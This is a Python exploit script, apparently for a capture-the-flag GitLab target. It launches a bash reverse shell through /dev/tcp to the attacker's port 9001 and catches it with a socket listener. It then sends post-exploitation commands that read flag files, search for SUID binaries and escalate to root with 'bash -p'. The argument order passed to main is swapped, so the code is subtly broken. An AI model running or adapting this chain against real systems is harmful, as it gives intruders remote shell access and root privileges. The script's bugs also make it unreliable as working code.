import socket
import subprocess
import sys
import time
import threading
def trigger_connection(target_url, ip_address_attacker):
    """Function to trigger the web shell connection after a delay"""
    print("[*] Waiting 5 seconds before triggering the connection...")
    time.sleep(5)

    try:
        # Replace this with your actual script that triggers the connection
        print("[*] Triggering connection to the listener...")
        subprocess.run(["python3", "/attacker/scripts/gitlab/poc.py", f"{target_url}", f"/bin/bash -c '/bin/bash -i >& /dev/tcp/{ip_address_attacker}/9001 0>&1'"])
        print("[*] Connection triggered. Check your listener.")
    except Exception as e:
        print(f"[!] Error triggering connection: {e}")

def setup_listener(epoch_num):
    """Sets up a netcat-like listener on port 9001"""
    host = '0.0.0.0'
    port = 9001

    print(f"[*] Setting up listener on {host}:{port}")

    # Create a socket object
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    try:
        # Bind to the port
        server_socket.bind((host, port))

        # Queue up to 5 requests
        server_socket.listen(5)
        print("[*] Listening on port 9001...")

        # Establish connection
        client_socket, addr = server_socket.accept()
        print(f"[*] Got connection from {addr}")

        # Send commands to the shell
        if epoch_num < 5:
            commands = [
                "find / -type f -name 'user.txt' 2>/dev/null",
                "cat /home/ctf/user.txt"
            ]
        else:
            commands = [
                "find / -type f -name 'user.txt' 2>/dev/null",
                "cat /home/ctf/user.txt",
                "find / -perm -4000 -type f 2>/dev/null",
                "/bin/bash -p",
                "cat /root/root.txt"
            ]

        print("[*] Sending commands to the shell:")
        for cmd in commands:
            print(f"[>] Executing: {cmd}")
            client_socket.send(f"{cmd}\n".encode())
            time.sleep(1)

            # Get response
            response = b""
            client_socket.settimeout(2)
            try:
                while True:
                    data = client_socket.recv(4096)
                    if not data:
                        break
                    response += data
            except socket.timeout:
                pass

            print("[<] Response:")
            print(response.decode('utf-8', errors='ignore'))

    except Exception as e:
        print(f"[!] Error in listener: {e}")
    finally:
        server_socket.close()
        # Close the connection
        client_socket.close()
        print("[*] Listener closed")

def main(target_url, ip_address_attacker, epoch_num):
    print("[*] Starting scan and exploit chain...")
    if target_url:
        print("[*] Starting network listener script")

        # Start the trigger function in a separate thread
        trigger_thread = threading.Thread(target=trigger_connection, args=[target_url, ip_address_attacker])
        trigger_thread.daemon = True
        trigger_thread.start()

        # Run the main listener
        setup_listener(epoch_num)
    else:
        print("[-] No vulnerable GitLab instance found")

if __name__ == "__main__":
    """python3 exploit.py subnet, ip_addr_attacker, target_url"""
    if len(sys.argv) != 4:
        print("Correct use:\n python3 exploit.py [ip_address_attacker] [target_url] [epoch_num]")
        exit(1)
    ip_addr_attacker = str(sys.argv[1])
    target_url = str(sys.argv[2])
    epoch_num = int(sys.argv[3])


    main(ip_addr_attacker, target_url, epoch_num)
